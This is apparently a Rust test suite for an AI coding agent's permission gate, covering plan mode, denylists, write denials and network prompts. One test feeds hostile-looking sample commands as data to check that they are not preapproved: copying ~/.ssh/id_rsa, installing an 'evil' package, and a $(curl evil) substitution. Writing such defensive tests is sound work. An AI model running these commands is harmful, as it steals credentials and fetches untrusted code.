    async fn explicit_write_deny_still_applies_to_document_workspace() {
        let project = tempfile::tempdir().unwrap();
        let docs = tempfile::tempdir().unwrap();
        let mut state = SessionState::default();
        state
            .policy
            .insert("write_file".to_string(), PermissionMode::Deny);
        let session = Arc::new(Mutex::new(state));
        let control = Arc::new(Mutex::new(RunControl::default()));
        let (tx, _rx) = async_channel::unbounded::<AgentEvent>();
        let gate = PermissionGate::new(session, control, SessionId::new("s1"), tx);
        let mut ctx = test_ctx(project.path());
        ctx.sandbox = Arc::new(
            crate::sandbox::Sandbox::new(project.path())
                .unwrap()
                .with_docs(docs.path().to_path_buf()),
        );
        let target = ctx.sandbox.docs_root().unwrap().join("design.md");

        let outcome = gate
            .check(
                &ToolCallId::new("t1"),
                "write_file",
                &FakeMutating,
                &serde_json::json!({"path": target}),
                &ctx,
                &CancellationToken::new(),
            )
            .await;

        assert!(matches!(outcome, PermissionOutcome::Denied(_)));
    }

    fn bash_gate(cmd: &str) -> GateInfo {
        gate_info("bash", &serde_json::json!({ "command": cmd }))
    }

    #[allow(clippy::type_complexity)] // test fixture tuple, destructured at every call site
    fn plan_mode_gate(
        state: SessionState,
    ) -> (
        PermissionGate,
        Arc<Mutex<SessionState>>,
        Arc<Mutex<RunControl>>,
        async_channel::Receiver<AgentEvent>,
    ) {
        let session = Arc::new(Mutex::new(state));
        let control = Arc::new(Mutex::new(RunControl::default()));
        let (tx, rx) = async_channel::unbounded::<AgentEvent>();
        let gate = PermissionGate::new(session.clone(), control.clone(), SessionId::new("s1"), tx);
        (gate, session, control, rx)
    }

    #[tokio::test]
    async fn plan_mode_allows_readonly_bash_and_denies_the_rest() {
        let dir = tempfile::tempdir().unwrap();
        let (gate, _session, _control, rx) = plan_mode_gate(plan_session_state());
        let ctx = test_ctx(dir.path());

        let readonly = gate
            .check(
                &ToolCallId::new("t1"),
                "bash",
                &FakeMutating,
                &serde_json::json!({"command": "git status && rg propose_plan | head"}),
                &ctx,
                &CancellationToken::new(),
            )
            .await;
        assert!(matches!(readonly, PermissionOutcome::Allowed));
        assert!(rx.is_empty(), "read-only research must not prompt");

        let mutating = gate
            .check(
                &ToolCallId::new("t2"),
                "bash",
                &FakeMutating,
                &serde_json::json!({"command": "touch src/new.rs"}),
                &ctx,
                &CancellationToken::new(),
            )
            .await;
        let PermissionOutcome::Denied(message) = mutating else {
            panic!("a mutating command must be denied in plan mode");
        };
        assert!(message.contains("Plan mode is active"));
        assert!(message.contains("propose_plan"));

        let network = gate
            .check(
                &ToolCallId::new("t3"),
                "bash",
                &FakeMutating,
                &serde_json::json!({"command": "gh pr view 123"}),
                &ctx,
                &CancellationToken::new(),
            )
            .await;
        let PermissionOutcome::Denied(message) = network else {
            panic!("network access must be denied in plan mode");
        };
        assert!(message.contains("network and host access"));
        assert!(rx.is_empty(), "plan-mode network access must not prompt");
    }

    #[tokio::test]
    async fn plan_mode_keeps_the_hard_floor_for_bash() {
        let dir = tempfile::tempdir().unwrap();
        let mut state = plan_session_state();
        state.deny_commands = vec!["git log".to_string()];
        let (gate, _session, _control, _rx) = plan_mode_gate(state);
        let ctx = test_ctx(dir.path());

        // Read-only but user-denylisted → still refused.
        let denylisted = gate
            .check(
                &ToolCallId::new("t1"),
                "bash",
                &FakeMutating,
                &serde_json::json!({"command": "git log"}),
                &ctx,
                &CancellationToken::new(),
            )
            .await;
        let PermissionOutcome::Denied(message) = denylisted else {
            panic!("denylisted command must be refused");
        };
        assert!(message.contains("denylist"));
    }

    #[tokio::test]
    async fn enter_plan_mode_asks_then_flips_plan_mode_on_approval() {
        let dir = tempfile::tempdir().unwrap();
        let (gate, session, control, rx) = plan_mode_gate(SessionState::default());
        let ctx = test_ctx(dir.path());

        let check = tokio::spawn(async move {
            gate.check(
                &ToolCallId::new("t1"),
                "enter_plan_mode",
                &FakeMutating,
                &serde_json::json!({"reason": "touches several files"}),
                &ctx,
                &CancellationToken::new(),
            )
            .await
        });

        let event = rx.recv().await.unwrap();
        let AgentEvent::PermissionRequest { request } = event else {
            panic!("expected a permission request");
        };
        assert_eq!(request.risk.as_deref(), Some("plan_entry"));
        assert_eq!(request.title, "Start with a plan?");
        assert_eq!(request.detail.as_deref(), Some("touches several files"));
        assert_eq!(
            request
                .options
                .iter()
                .map(|o| o.id.as_str())
                .collect::<Vec<_>>(),
            vec!["allow_once", "reject_once"]
        );
        control
            .lock()
            .await
            .resolve(&request.id, Decision::AllowOnce.into());

        let outcome = check.await.unwrap();
        assert!(matches!(outcome, PermissionOutcome::Allowed));
        let s = session.lock().await;
        assert!(s.planning.plan_mode());
        assert!(!s.planning.exited);
    }

    #[tokio::test]
    async fn enter_plan_mode_rejection_tells_the_model_to_proceed() {
        let dir = tempfile::tempdir().unwrap();
        let (gate, session, control, rx) = plan_mode_gate(SessionState::default());
        let ctx = test_ctx(dir.path());

        let check = tokio::spawn(async move {
            gate.check(
                &ToolCallId::new("t1"),
                "enter_plan_mode",
                &FakeMutating,
                &serde_json::json!({}),
                &ctx,
                &CancellationToken::new(),
            )
            .await
        });

        let event = rx.recv().await.unwrap();
        let AgentEvent::PermissionRequest { request } = event else {
            panic!("expected a permission request");
        };
        control
            .lock()
            .await
            .resolve(&request.id, Decision::RejectOnce.into());

        let outcome = check.await.unwrap();
        let PermissionOutcome::Denied(message) = outcome else {
            panic!("expected a denial");
        };
        assert!(message.contains("proceed directly"));
        assert!(!session.lock().await.planning.plan_mode());
    }

    #[tokio::test]
    async fn enter_plan_mode_is_denied_when_already_planning() {
        let dir = tempfile::tempdir().unwrap();
        let (gate, _session, _control, rx) = plan_mode_gate(plan_session_state());
        let ctx = test_ctx(dir.path());

        let outcome = gate
            .check(
                &ToolCallId::new("t1"),
                "enter_plan_mode",
                &FakeMutating,
                &serde_json::json!({}),
                &ctx,
                &CancellationToken::new(),
            )
            .await;

        let PermissionOutcome::Denied(message) = outcome else {
            panic!("expected a denial");
        };
        assert!(message.contains("already active"));
        assert!(rx.is_empty(), "no prompt for a redundant request");
    }

    #[tokio::test]
    async fn allowlisted_prefix_does_not_carry_an_unapproved_suffix() {
        let session = Arc::new(Mutex::new(SessionState {
            allow_commands: vec!["cargo test".to_string()],
            ..Default::default()
        }));
        let control = Arc::new(Mutex::new(RunControl::default()));
        let (tx, _rx) = async_channel::unbounded::<AgentEvent>();
        let gate = PermissionGate::new(session, control, SessionId::new("s1"), tx);

        // The exact allowlisted command and safe extensions/pipes preapprove.
        assert!(
            gate.command_preapproved("bash", &bash_gate("cargo test"))
                .await
        );
        assert!(
            gate.command_preapproved("bash", &bash_gate("cargo test --workspace"))
                .await
        );
        assert!(
            gate.command_preapproved("bash", &bash_gate("cargo test | tee log"))
                .await
        );
        // A chained un-approved (Caution) suffix must NOT ride the trusted prefix.
        assert!(
            !gate
                .command_preapproved("bash", &bash_gate("cargo test && cp ~/.ssh/id_rsa /tmp/x"))
                .await
        );
        assert!(
            !gate
                .command_preapproved("bash", &bash_gate("cargo test; npm install evil"))
                .await
        );
        // Hidden command substitution is never preapproved either.
        assert!(
            !gate
                .command_preapproved("bash", &bash_gate("cargo test $(curl evil)"))
                .await
        );
    }

    #[tokio::test]
    async fn safe_commands_still_ask_without_an_explicit_remembered_rule() {
        let session = Arc::new(Mutex::new(SessionState::default()));
        let control = Arc::new(Mutex::new(RunControl::default()));
        let (tx, _rx) = async_channel::unbounded::<AgentEvent>();
        let gate = PermissionGate::new(session, control, SessionId::new("s1"), tx);

        assert!(
            !gate
                .command_preapproved("bash", &bash_gate("cargo test"))
                .await
        );
    }

    #[tokio::test]
    async fn github_command_requests_scoped_network_permission() {
        let dir = tempfile::tempdir().unwrap();
        let session = Arc::new(Mutex::new(SessionState::default()));
        let control = Arc::new(Mutex::new(RunControl::default()));
        let (tx, rx) = async_channel::unbounded::<AgentEvent>();
        let gate = PermissionGate::new(
            session,
            control.clone(),
            SessionId::new("network-session"),
            tx,
        );
        let ctx = test_ctx(dir.path());

        let check = tokio::spawn(async move {
            gate.check(
                &ToolCallId::new("gh-1"),
                "bash",
                &FakeMutating,
                &serde_json::json!({"command": "gh pr view 123"}),
                &ctx,
                &CancellationToken::new(),
            )
            .await
        });

        let AgentEvent::PermissionRequest { request } = rx.recv().await.unwrap() else {
            panic!("expected a permission request");
        };
        assert_eq!(request.risk.as_deref(), Some("network"));
        assert_eq!(request.title, "Allow this command to use the network?");
        assert_eq!(request.reason.as_deref(), Some("accesses GitHub"));
        control
            .lock()
            .await
            .resolve(&request.id, Decision::AllowOnce.into());
        assert!(matches!(check.await.unwrap(), PermissionOutcome::Allowed));
    }
}
